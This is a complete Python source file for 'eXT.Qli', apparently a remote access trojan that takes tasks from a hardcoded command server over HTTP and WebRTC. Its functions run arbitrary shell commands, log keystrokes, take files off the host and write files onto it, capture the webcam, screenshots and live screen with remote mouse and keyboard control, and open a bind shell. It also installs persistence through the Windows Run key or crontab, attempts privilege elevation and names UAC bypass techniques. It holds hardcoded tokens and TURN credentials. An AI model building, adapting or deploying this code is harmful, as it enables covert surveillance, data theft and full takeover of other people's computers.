#!/usr/bin/env python3
"""
eXT.Qli Windows/Linux agent with WebRTC screen streaming and remote control.
Uses HTTP signaling (no WebSocket) and a persistent WebRTC data channel for tasks.
TURN server configured.
"""

from __future__ import annotations

import asyncio
import base64
import ctypes
import hashlib
import json
import os
import platform
import secrets
import shutil
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse
from urllib.request import Request, urlopen

# WebRTC dependencies
try:
    from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, RTCConfiguration, RTCIceServer
    from av import VideoFrame
    import mss
    WEBRTC_AVAILABLE = True
except ImportError:
    WEBRTC_AVAILABLE = False

# Other optional dependencies
try:
    import pynput.keyboard
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

# =========================
# Configuration
# =========================
SERVER_HOST = "10.201.0.254"
BASE_HTTP_URL = f"http://{SERVER_HOST}/eXT.Qli"
SIGNALING_URL = f"{BASE_HTTP_URL}/backend/api/signaling.php"
HEARTBEAT_URL = f"{BASE_HTTP_URL}/backend/api/agent_heartbeat.php"
TASK_RESULT_URL = f"{BASE_HTTP_URL}/backend/api/agent_task_result.php"

SHARED_TOKEN = "extqli_@2026token$$"

HEARTBEAT_INTERVAL_SECONDS = 30
SIGNALING_POLL_INTERVAL_SECONDS = 5
HTTP_TIMEOUT_SECONDS = 10

STATE_FILE = Path(__file__).resolve().with_name("agent_state.json")
LOG_PREFIX = "[eXT.Qli Agent]"

# Keylogger storage
KEYLOG_FILE = Path(tempfile.gettempdir()) / "extqli_keylog.txt"
KEYLOG_ACTIVE = False
KEYLOG_THREAD = None
KEYLOG_LOCK = threading.Lock()

# TCP server globals
TCP_SERVER_THREAD: Optional[threading.Thread] = None
TCP_SERVER_STOP_EVENT = threading.Event()
TCP_SERVER_SOCKET: Optional[socket.socket] = None
TCP_SERVER_PORT: int = 0

# WebRTC globals
webrtc_peer: Optional[RTCPeerConnection] = None
webrtc_data_channel: Optional[Any] = None
webrtc_loop: Optional[asyncio.AbstractEventLoop] = None
webrtc_connection_ready = threading.Event()
signaling_stop_event = threading.Event()

# =========================
# Logging helpers
# =========================
def log(message: str) -> None:
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"{LOG_PREFIX} {ts} - {message}", flush=True)

# =========================
# Persistent state
# =========================
def load_or_create_state() -> Dict[str, str]:
    if STATE_FILE.exists():
        try:
            data = json.loads(STATE_FILE.read_text(encoding="utf-8"))
            if data.get("agent_uuid") and data.get("agent_token"):
                return {
                    "agent_uuid": str(data["agent_uuid"]),
                    "agent_token": str(data["agent_token"]),
                }
        except Exception as exc:
            log(f"Could not read state file, regenerating. Reason: {exc}")

    state = {
        "agent_uuid": str(uuid.uuid4()),
        "agent_token": secrets.token_hex(16),
    }
    STATE_FILE.write_text(json.dumps(state, indent=2), encoding="utf-8")
    return state

STATE = load_or_create_state()
AGENT_UUID = STATE["agent_uuid"]
AGENT_TOKEN = STATE["agent_token"]
STOP_EVENT = threading.Event()

# =========================
# System information
# =========================
def get_hostname() -> str:
    return socket.gethostname()

def get_local_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((SERVER_HOST, 80))
            return s.getsockname()[0]
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "10.201.0.254"

def get_mac_address() -> str:
    mac = uuid.getnode()
    return ":".join(f"{(mac >> shift) & 0xFF:02X}" for shift in range(40, -1, -8))

def get_os_name() -> str:
    return platform.system() or "Unknown"

def get_os_version() -> str:
    return platform.version() or platform.release() or "Unknown"

def get_architecture() -> str:
    return platform.machine() or platform.architecture()[0] or "Unknown"

def get_cpu_info() -> str:
    cpu = platform.processor().strip()
    if cpu:
        return cpu
    if os.name == "nt":
        try:
            output = subprocess.check_output(
                ["wmic", "cpu", "get", "name"],
                stderr=subprocess.DEVNULL,
                text=True,
                encoding="utf-8",
                errors="ignore",
            )
            lines = [line.strip() for line in output.splitlines() if line.strip() and line.strip().lower() != "name"]
            if lines:
                return lines[0]
        except Exception:
            pass
    return "Unknown CPU"

def get_ram_mb() -> int:
    if os.name == "nt":
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]
        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat)):
            return int(stat.ullTotalPhys / (1024 * 1024))
    if hasattr(os, "sysconf"):
        try:
            page_size = os.sysconf("SC_PAGE_SIZE")
            phys_pages = os.sysconf("SC_PHYS_PAGES")
            return int((page_size * phys_pages) / (1024 * 1024))
        except Exception:
            pass
    return 0

def get_disk_stats() -> Tuple[float, float]:
    target = os.environ.get("SystemDrive", "C:") if os.name == "nt" else "/"
    try:
        usage = shutil.disk_usage(target)
        total_gb = round(usage.total / (1024 ** 3), 2)
        free_gb = round(usage.free / (1024 ** 3), 2)
        return total_gb, free_gb
    except Exception:
        return 0.0, 0.0

def get_uptime_seconds() -> int:
    if os.name == "nt":
        try:
            return int(ctypes.windll.kernel32.GetTickCount64() / 1000)
        except Exception:
            return 0
    try:
        with open("/proc/uptime", "r", encoding="utf-8") as fh:
            return int(float(fh.read().split()[0]))
    except Exception:
        return 0

def get_wazuh_status() -> str:
    if os.name == "nt":
        for service_name in ("WazuhSvc", "wazuh", "Wazuh"):
            try:
                output = subprocess.check_output(
                    ["sc", "query", service_name],
                    stderr=subprocess.DEVNULL,
                    text=True,
                    encoding="utf-8",
                    errors="ignore",
                )
                upper = output.upper()
                if "RUNNING" in upper:
                    return "running"
                if "STOPPED" in upper:
                    return "stopped"
            except Exception:
                continue
        return "not_installed"
    for service_name in ("wazuh-agent", "wazuh-agent.service"):
        try:
            proc = subprocess.run(
                ["systemctl", "is-active", service_name],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                encoding="utf-8",
                errors="ignore",
                timeout=3,
            )
            status = proc.stdout.strip().lower()
            if status in {"active", "inactive", "failed"}:
                return status
        except Exception:
            continue
    return "unknown"

# FIX #4: report the agent's actual primary monitor resolution so the browser
# can scale remote-control mouse coordinates correctly.
def get_screen_resolution() -> Tuple[int, int]:
    try:
        import mss as _mss
        with _mss.mss() as sct:
            monitor = sct.monitors[1]  # monitors[0] is the combined virtual screen
            return int(monitor["width"]), int(monitor["height"])
    except Exception:
        return 0, 0

def collect_system_info(extended: bool = False) -> Dict[str, Any]:
    total_gb, free_gb = get_disk_stats()
    screen_w, screen_h = get_screen_resolution()  # FIX #4
    info = {
        "agent_uuid": AGENT_UUID,
        "agent_token": AGENT_TOKEN,
        "hostname": get_hostname(),
        "os_name": get_os_name(),
        "os_version": get_os_version(),
        "architecture": get_architecture(),
        "local_ip": get_local_ip(),
        "mac_address": get_mac_address(),
        "cpu_info": get_cpu_info(),
        "ram_mb": get_ram_mb(),
        "disk_total_gb": total_gb,
        "disk_free_gb": free_gb,
        "uptime_seconds": get_uptime_seconds(),
        "wazuh_status": get_wazuh_status(),
        "screen_width": screen_w,   # FIX #4: new field
        "screen_height": screen_h,  # FIX #4: new field
    }
    if extended:
        info["username"] = os.getlogin() if hasattr(os, "getlogin") else "unknown"
        info["current_dir"] = os.getcwd()
        info["python_version"] = platform.python_version()
        info["platform"] = platform.platform()
    return info

def build_heartbeat_payload() -> Dict[str, Any]:
    payload = collect_system_info()
    payload["shared_token"] = SHARED_TOKEN
    return payload

# =========================
# HTTP helpers
# =========================
def http_post_json(url: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    body = json.dumps(payload).encode("utf-8")
    req = Request(
        url,
        data=body,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
            "User-Agent": "eXT.Qli-Agent/1.0",
        },
        method="POST",
    )
    with urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
        raw = resp.read().decode("utf-8", errors="replace")
        return json.loads(raw) if raw.strip() else {}

def http_get_json(url: str) -> Dict[str, Any]:
    req = Request(url, method="GET", headers={"Accept": "application/json"})
    with urlopen(req, timeout=HTTP_TIMEOUT_SECONDS) as resp:
        raw = resp.read().decode("utf-8", errors="replace")
        return json.loads(raw) if raw.strip() else {}

def send_heartbeat_once() -> None:
    payload = build_heartbeat_payload()
    try:
        response = http_post_json(HEARTBEAT_URL, payload)
        log(f"Heartbeat sent: {response}")
    except Exception as exc:
        log(f"Heartbeat failed: {exc}")

def send_task_result(task_id: Optional[int], result_status: str, output_text: str) -> None:
    if not task_id:
        log("Task result not posted because no task_id was provided by the server.")
        return
    payload = {
        "shared_token": SHARED_TOKEN,
        "agent_uuid": AGENT_UUID,
        "task_id": int(task_id),
        "result_status": result_status,
        "output_text": output_text,
    }
    try:
        response = http_post_json(TASK_RESULT_URL, payload)
        log(f"Task result posted: {response}")
    except Exception as exc:
        log(f"Failed to post task result: {exc}")

def heartbeat_loop() -> None:
    while not STOP_EVENT.is_set():
        send_heartbeat_once()
        STOP_EVENT.wait(HEARTBEAT_INTERVAL_SECONDS)

# =========================
# WebRTC Screen Capture Track
# =========================
class ScreenCaptureTrack(VideoStreamTrack):
    kind = "video"

    def __init__(self):
        super().__init__()
        self.sct = mss.mss()
        self.monitor = self.sct.monitors[1]
        self.width = self.monitor['width']
        self.height = self.monitor['height']
        self.frame_rate = 30
        self.last_frame_time = 0
        log(f"Screen capture started: {self.width}x{self.height}")

    async def recv(self):
        try:
            pts, time_base = await self.next_timestamp()
            now = time.time()
            delay = max(0, (1.0 / self.frame_rate) - (now - self.last_frame_time))
            if delay:
                await asyncio.sleep(delay)

            img = self.sct.grab(self.monitor)
            import numpy as np
            frame_array = np.array(img)[:, :, :3]   # BGRA -> BGR (drop alpha)
            frame = VideoFrame.from_ndarray(frame_array, format="bgr24")
            frame.pts = pts
            frame.time_base = time_base
            self.last_frame_time = time.time()
            return frame
        except Exception as e:
            log(f"Screen capture error: {e}")
            # Return a dummy frame to avoid breaking the stream
            import numpy as np
            pts, time_base = await self.next_timestamp()
            dummy = np.zeros((self.height, self.width, 3), dtype=np.uint8)
            frame = VideoFrame.from_ndarray(dummy, format="bgr24")
            frame.pts = pts
            frame.time_base = time_base
            return frame

# =========================
# Remote control functions
# =========================
def handle_mouse_move(x: int, y: int) -> None:
    if PYAUTOGUI_AVAILABLE:
        try:
            pyautogui.moveTo(x, y)
        except Exception as e:
            log(f"Mouse move error: {e}")

def handle_mouse_click(button: str, pressed: bool) -> None:
    if not PYAUTOGUI_AVAILABLE:
        return
    try:
        btn = pyautogui.LEFT if button == 'left' else (pyautogui.RIGHT if button == 'right' else pyautogui.MIDDLE)
        if pressed:
            pyautogui.mouseDown(button=btn)
        else:
            pyautogui.mouseUp(button=btn)
    except Exception as e:
        log(f"Mouse click error: {e}")

def handle_mouse_scroll(delta: int) -> None:
    if PYAUTOGUI_AVAILABLE:
        try:
            pyautogui.scroll(delta)
        except Exception as e:
            log(f"Scroll error: {e}")

def handle_key_event(key: str, pressed: bool) -> None:
    if not PYAUTOGUI_AVAILABLE:
        return
    try:
        if pressed:
            pyautogui.keyDown(key)
        else:
            pyautogui.keyUp(key)
    except Exception as e:
        log(f"Key error: {e}")

# =========================
# Task execution
# =========================
def execute_command(command: str) -> Tuple[str, str]:
    try:
        proc = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=60,
        )
        return proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return "", "Command timed out after 60 seconds."
    except Exception as e:
        return "", str(e)

def keylogger_start() -> str:
    global KEYLOG_ACTIVE, KEYLOG_THREAD
    with KEYLOG_LOCK:
        if KEYLOG_ACTIVE:
            return "Keylogger is already active."
        if not KEYBOARD_AVAILABLE:
            return "Keylogger not available: pynput module missing."
        try:
            KEYLOG_FILE.write_text("", encoding="utf-8")
            def on_press(key):
                try:
                    char = key.char
                except AttributeError:
                    char = f" [{key}] "
                with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                    f.write(char)
            listener = pynput.keyboard.Listener(on_press=on_press)
            listener.start()
            KEYLOG_ACTIVE = True
            KEYLOG_THREAD = listener
            return "Keylogger started. Logging to " + str(KEYLOG_FILE)
        except Exception as e:
            return f"Failed to start keylogger: {e}"

def keylogger_stop() -> str:
    global KEYLOG_ACTIVE, KEYLOG_THREAD
    with KEYLOG_LOCK:
        if not KEYLOG_ACTIVE:
            return "Keylogger is not active."
        try:
            if KEYLOG_THREAD and hasattr(KEYLOG_THREAD, "stop"):
                KEYLOG_THREAD.stop()
            elif KEYLOG_THREAD:
                KEYLOG_THREAD = None
            KEYLOG_ACTIVE = False
            if KEYLOG_FILE.exists():
                content = KEYLOG_FILE.read_text(encoding="utf-8", errors="replace")
            else:
                content = ""
            return f"Keylogger stopped. Captured keystrokes:\n{content}"
        except Exception as e:
            return f"Error stopping keylogger: {e}"

def file_upload(file_path: str) -> str:
    path = Path(file_path)
    if not path.exists():
        return f"File not found: {file_path}"
    try:
        data = path.read_bytes()
        encoded = base64.b64encode(data).decode("ascii")
        return f"FILE:{path.name}:{encoded}"
    except Exception as e:
        return f"Failed to read file: {e}"

def file_download(file_path: str, content_b64: str) -> str:
    path = Path(file_path)
    try:
        data = base64.b64decode(content_b64)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        return f"File written to {path.resolve()}"
    except Exception as e:
        return f"Failed to write file: {e}"

def webcam_capture() -> str:
    if not CV2_AVAILABLE:
        return "Webcam capture not available: opencv-python missing."
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return "Could not open webcam."
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return "Failed to capture frame."
    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
    encoded = base64.b64encode(buffer).decode("ascii")
    return f"WEBCAM:{encoded}"

def screenshot() -> str:
    if not PYAUTOGUI_AVAILABLE:
        return "Screenshot not available: pyautogui missing."
    try:
        img = pyautogui.screenshot()
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
            temp_path = f.name
        img.save(temp_path, format="PNG")
        with open(temp_path, "rb") as f:
            data = f.read()
        os.unlink(temp_path)
        encoded = base64.b64encode(data).decode("ascii")
        return f"SCREENSHOT:{encoded}"
    except Exception as e:
        return f"Screenshot failed: {e}"

def tcp_server_run(port: int, welcome_message: bytes, interactive: bool = True) -> None:
    global TCP_SERVER_SOCKET, TCP_SERVER_PORT
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        host = get_local_ip()
        sock.bind((host, port))
        sock.listen(5)
        TCP_SERVER_SOCKET = sock
        TCP_SERVER_PORT = port
        log(f"TCP server listening on {host}:{port} (interactive={interactive})")
        while not TCP_SERVER_STOP_EVENT.is_set():
            try:
                sock.settimeout(1.0)
                client_sock, client_addr = sock.accept()
                log(f"TCP connection from {client_addr}")
                if interactive:
                    threading.Thread(target=handle_shell_client, args=(client_sock, client_addr), daemon=True).start()
                else:
                    client_sock.sendall(welcome_message)
                    client_sock.close()
            except socket.timeout:
                continue
            except Exception as e:
                if not TCP_SERVER_STOP_EVENT.is_set():
                    log(f"TCP server accept error: {e}")
                break
    except Exception as e:
        log(f"Failed to start TCP server: {e}")
    finally:
        if TCP_SERVER_SOCKET:
            try:
                TCP_SERVER_SOCKET.close()
            except:
                pass
        TCP_SERVER_SOCKET = None
        TCP_SERVER_PORT = 0
        log("TCP server stopped")

def handle_shell_client(client_sock: socket.socket, addr: Tuple[str, int]) -> None:
    try:
        if os.name == "nt":
            shell_cmd = ["cmd.exe"]
        else:
            shell_cmd = ["/bin/bash", "-i"]
        proc = subprocess.Popen(
            shell_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True,
        )
        client_sock.sendall(b"\n=== eXT.Qli Interactive Shell ===\nType 'exit' to close.\n\n")
        def read_from_proc():
            while proc.poll() is None:
                try:
                    out = proc.stdout.readline()
                    if not out:
                        break
                    client_sock.sendall(out.encode())
                except Exception:
                    break
        def read_from_sock():
            while proc.poll() is None:
                try:
                    data = client_sock.recv(4096)
                    if not data:
                        break
                    proc.stdin.write(data.decode())
                    proc.stdin.flush()
                except Exception:
                    break
        t1 = threading.Thread(target=read_from_proc, daemon=True)
        t2 = threading.Thread(target=read_from_sock, daemon=True)
        t1.start()
        t2.start()
        t1.join(timeout=1)
        t2.join(timeout=1)
    except Exception as e:
        try:
            client_sock.sendall(f"\nShell error: {e}\n".encode())
        except:
            pass
    finally:
        try:
            client_sock.close()
        except:
            pass

def tcp_server_start(port: int, welcome_message: str = "Hello!\n", interactive: bool = True) -> str:
    global TCP_SERVER_THREAD, TCP_SERVER_STOP_EVENT, TCP_SERVER_PORT
    with threading.Lock():
        if TCP_SERVER_THREAD and TCP_SERVER_THREAD.is_alive():
            return f"TCP server already running on port {TCP_SERVER_PORT}"
        TCP_SERVER_STOP_EVENT.clear()
        TCP_SERVER_THREAD = threading.Thread(
            target=tcp_server_run,
            args=(port, welcome_message.encode("utf-8"), interactive),
            name="tcp-server",
            daemon=True
        )
        TCP_SERVER_THREAD.start()
        return f"TCP server started on port {port} (local IP: {get_local_ip()}) with interactive={'yes' if interactive else 'no'}"

def tcp_server_stop() -> str:
    global TCP_SERVER_THREAD, TCP_SERVER_STOP_EVENT
    with threading.Lock():
        if not (TCP_SERVER_THREAD and TCP_SERVER_THREAD.is_alive()):
            return "TCP server is not running."
        TCP_SERVER_STOP_EVENT.set()
        TCP_SERVER_THREAD.join(timeout=3.0)
        TCP_SERVER_THREAD = None
        return "TCP server stopped."

def install_persistence() -> str:
    script_path = str(Path(__file__).resolve())
    python_exe = sys.executable
    if os.name == "nt":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "eXTQliAgent", 0, winreg.REG_SZ, f'"{python_exe}" "{script_path}"')
            winreg.CloseKey(key)
            return "Persistence installed: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\eXTQliAgent"
        except Exception as e:
            return f"Failed to install Windows persistence: {e}"
    else:
        try:
            cron_line = f"@reboot {python_exe} {script_path} > /dev/null 2>&1"
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current = result.stdout
            if cron_line in current:
                return "Persistence already present in crontab."
            new_cron = current.rstrip() + "\n" + cron_line + "\n"
            proc = subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
            if proc.returncode == 0:
                return "Persistence installed: @reboot crontab entry added."
            else:
                return f"Failed to install crontab: {proc.stderr}"
        except Exception as e:
            return f"Failed to install Linux persistence: {e}"

def remove_persistence() -> str:
    script_path = str(Path(__file__).resolve())
    if os.name == "nt":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "eXTQliAgent")
            winreg.CloseKey(key)
            return "Persistence removed from Windows Registry."
        except FileNotFoundError:
            return "Persistence entry not found."
        except Exception as e:
            return f"Failed to remove Windows persistence: {e}"
    else:
        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if result.returncode != 0:
                return "No crontab for this user."
            lines = result.stdout.splitlines()
            cron_line = f"@reboot {sys.executable} {script_path} > /dev/null 2>&1"
            new_lines = [line for line in lines if line.strip() != cron_line]
            new_cron = "\n".join(new_lines) + "\n"
            proc = subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
            if proc.returncode == 0:
                return "Persistence removed from crontab."
            else:
                return f"Failed to update crontab: {proc.stderr}"
        except Exception as e:
            return f"Failed to remove Linux persistence: {e}"

def is_admin() -> bool:
    if os.name == "nt":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        return os.geteuid() == 0

def run_as_admin(command: str) -> str:
    if is_admin():
        stdout, stderr = execute_command(command)
        return f"[Already admin] STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
    if os.name == "nt":
        try:
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", "cmd.exe", f"/c {command}", None, 1
            )
            if result > 32:
                return f"Elevated command started with ShellExecute. Check manually. Command: {command}"
            else:
                return f"Elevation failed. ShellExecute error code: {result}"
        except Exception as e:
            return f"Failed to elevate: {e}"
    else:
        sudo_cmd = f"sudo {command}"
        stdout, stderr = execute_command(sudo_cmd)
        if stderr:
            return f"Elevation failed (maybe need password?)\nSTDERR:\n{stderr}\nSTDOUT:\n{stdout}"
        return f"Elevated command succeeded.\nSTDOUT:\n{stdout}"

def privesc_example() -> str:
    if is_admin():
        return "Already running as admin/root."
    suggestions = []
    if os.name == "nt":
        suggestions.append("Use 'run_as_admin' task with a command like 'whoami' to test.")
        suggestions.append("Or use known UAC bypasses (e.g., fodhelper, cmstp) via 'cmd' task.")
    else:
        suggestions.append("Use 'run_as_admin' task with a command like 'id' to test.")
        suggestions.append("Or use 'sudo -i' if password is cached.")
    return "Not elevated. Suggestions:\n" + "\n".join(suggestions)

def handle_task(task_data: Dict[str, Any], task_id: Optional[str]) -> str:
    task_name = task_data.get("task", "").strip().lower()
    data = task_data.get("data", {})

    if task_name == "ping":
        return f"pong from {get_hostname()} ({get_local_ip()})"
    if task_name in {"collect_info", "info", "heartbeat"}:
        info = collect_system_info(extended=True)
        return json.dumps(info, ensure_ascii=False)
    if task_name == "cmd":
        command = data.get("command")
        if not command:
            return "No command provided."
        stdout, stderr = execute_command(command)
        if stderr:
            return f"STDOUT:\n{stdout}\nSTDERR:\n{stderr}"
        return stdout
    if task_name == "keylogger_start":
        return keylogger_start()
    if task_name == "keylogger_stop":
        return keylogger_stop()
    if task_name == "file_upload":
        file_path = data.get("file_path")
        if not file_path:
            return "No file_path provided."
        return file_upload(file_path)
    if task_name == "file_download":
        file_path = data.get("file_path")
        content_b64 = data.get("content")
        if not file_path or not content_b64:
            return "Missing file_path or content."
        return file_download(file_path, content_b64)
    if task_name == "webcam":
        return webcam_capture()
    if task_name == "screenshot":
        return screenshot()
    if task_name == "tcp_server_start":
        port = data.get("port")
        if port is None:
            return "Missing port number."
        try:
            port = int(port)
        except ValueError:
            return "Invalid port number."
        welcome_msg = data.get("message", "Hello!\n")
        interactive = data.get("interactive", True)
        if isinstance(interactive, str):
            interactive = interactive.lower() in ("true", "1", "yes")
        return tcp_server_start(port, welcome_msg, interactive)
    if task_name == "tcp_server_stop":
        return tcp_server_stop()
    if task_name == "install_persistence":
        return install_persistence()
    if task_name == "remove_persistence":
        return remove_persistence()
    if task_name == "is_admin":
        return f"Admin/root: {is_admin()}"
    if task_name == "run_as_admin":
        command = data.get("command")
        if not command:
            return "No command provided for elevation."
        return run_as_admin(command)
    if task_name == "privesc_example":
        return privesc_example()

    return f"Unsupported task: {task_name}"

# =========================
# WebRTC Signaling via HTTP (polling)
# =========================
def send_signal(action: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    url = f"{SIGNALING_URL}?action={action}"
    return http_post_json(url, payload)

def poll_for_offers():
    global webrtc_loop
    while not signaling_stop_event.is_set():
        try:
            resp = http_get_json(f"{SIGNALING_URL}?action=poll_offer&agent_uuid={AGENT_UUID}")
            if resp.get("has_offer"):
                offer_sdp = resp.get("offer_sdp")
                viewer_id = resp.get("viewer_id")
                if offer_sdp and viewer_id:
                    log(f"Received offer from {viewer_id}")
                    asyncio.run_coroutine_threadsafe(
                        establish_webrtc(offer_sdp, viewer_id),
                        webrtc_loop
                    )
        except Exception as e:
            log(f"Polling offers error: {e}")
        signaling_stop_event.wait(SIGNALING_POLL_INTERVAL_SECONDS)

async def establish_webrtc(offer_sdp: str, viewer_id: str):
    global webrtc_peer, webrtc_data_channel, webrtc_connection_ready
    if not WEBRTC_AVAILABLE:
        log("WebRTC not available, cannot establish connection")
        return
    if webrtc_peer:
        await webrtc_peer.close()

    # TURN configuration
    TURN_SERVER = "turn:10.201.0.254:3478"
    TURN_USERNAME = "tachyon"
    TURN_CREDENTIAL = "TachyonDragon"

    config = RTCConfiguration(
        iceServers=[
            RTCIceServer(urls=["stun:stun.l.google.com:19302"]),
            RTCIceServer(urls=[TURN_SERVER], username=TURN_USERNAME, credential=TURN_CREDENTIAL)
        ]
    )
    webrtc_peer = RTCPeerConnection(configuration=config)

    # FIX #2: Register ALL event handlers immediately after creating the
    # RTCPeerConnection, before setRemoteDescription / createAnswer. On fast
    # local networks the connection can transition through states (checking →
    # connected) before the answer is even sent, so handlers registered after
    # submit_answer would miss those events and webrtc_connection_ready would
    # never be set.
    @webrtc_peer.on("connectionstatechange")
    async def on_connectionstatechange():
        log(f"Connection state: {webrtc_peer.connectionState}")
        if webrtc_peer.connectionState == "connected":
            log("WebRTC connected – video should appear")
            webrtc_connection_ready.set()
        elif webrtc_peer.connectionState in ("failed", "closed"):
            log(f"WebRTC connection {webrtc_peer.connectionState}")
            webrtc_connection_ready.clear()

    @webrtc_peer.on("iceconnectionstatechange")
    async def on_iceconnectionstatechange():
        log(f"ICE connection state: {webrtc_peer.iceConnectionState}")

    # Add screen capture track
    video_track = ScreenCaptureTrack()
    webrtc_peer.addTrack(video_track)

    # Data channel for remote control and tasks (browser creates it, agent receives)
    @webrtc_peer.on("datachannel")
    def on_datachannel(channel):
        global webrtc_data_channel
        webrtc_data_channel = channel
        webrtc_connection_ready.set()
        log("Data channel opened")

        @channel.on("message")
        def on_message(message):
            try:
                data = json.loads(message)
                if "task" in data:
                    task_id = data.get("task_id")
                    task_name = data.get("task")
                    result = handle_task(data, task_id)
                    response = {
                        "type": "task_result",
                        "task_id": task_id,
                        "result_status": "success",
                        "output_text": result
                    }
                    channel.send(json.dumps(response))
                elif "event_type" in data:
                    event_type = data["event_type"]
                    if event_type == "mouse_move":
                        handle_mouse_move(data.get("x"), data.get("y"))
                    elif event_type == "mouse_click":
                        handle_mouse_click(data.get("button"), data.get("pressed"))
                    elif event_type == "mouse_scroll":
                        handle_mouse_scroll(data.get("delta"))
                    elif event_type == "key":
                        handle_key_event(data.get("key"), data.get("pressed"))
            except Exception as e:
                log(f"Data channel message error: {e}")

    # Set remote description (offer from browser)
    offer = RTCSessionDescription(sdp=offer_sdp, type="offer")
    await webrtc_peer.setRemoteDescription(offer)
    log("Remote description set")

    # Create answer
    answer = await webrtc_peer.createAnswer()
    await webrtc_peer.setLocalDescription(answer)
    log("Local description set")

    # Wait for ICE gathering to complete (Vanilla ICE: all candidates go in the SDP)
    log("Waiting for ICE gathering to complete...")
    if webrtc_peer.iceGatheringState != "complete":
        while webrtc_peer.iceGatheringState != "complete":
            await asyncio.sleep(0.1)
    log(f"ICE gathering state: {webrtc_peer.iceGatheringState}")

    # Send the complete answer SDP (with all candidates embedded)
    send_signal("submit_answer", {
        "viewer_id": viewer_id,
        "answer_sdp": webrtc_peer.localDescription.sdp
    })
    log("WebRTC answer sent")

# =========================
# Main agent loop
# =========================
def main() -> int:
    log("Starting agent (WebRTC + HTTP signaling)")
    log(f"Agent UUID: {AGENT_UUID}")
    log(f"State file: {STATE_FILE}")

    # Create the single asyncio event loop
    global webrtc_loop
    webrtc_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(webrtc_loop)

    # Start heartbeat thread
    heartbeat_thread = threading.Thread(target=heartbeat_loop, name="heartbeat-loop", daemon=True)
    heartbeat_thread.start()

    # Start signaling poller thread (uses the global loop)
    poller_thread = threading.Thread(target=poll_for_offers, name="signaling-poller", daemon=True)
    poller_thread.start()

    try:
        # Run the asyncio event loop forever
        webrtc_loop.run_forever()
    except KeyboardInterrupt:
        log("Interrupted by user")
    finally:
        STOP_EVENT.set()
        signaling_stop_event.set()
        if TCP_SERVER_THREAD and TCP_SERVER_THREAD.is_alive():
            tcp_server_stop()
        heartbeat_thread.join(timeout=2)
        if webrtc_loop:
            webrtc_loop.close()
        log("Agent stopped")

    return 0

if __name__ == "__main__":
    sys.exit(main())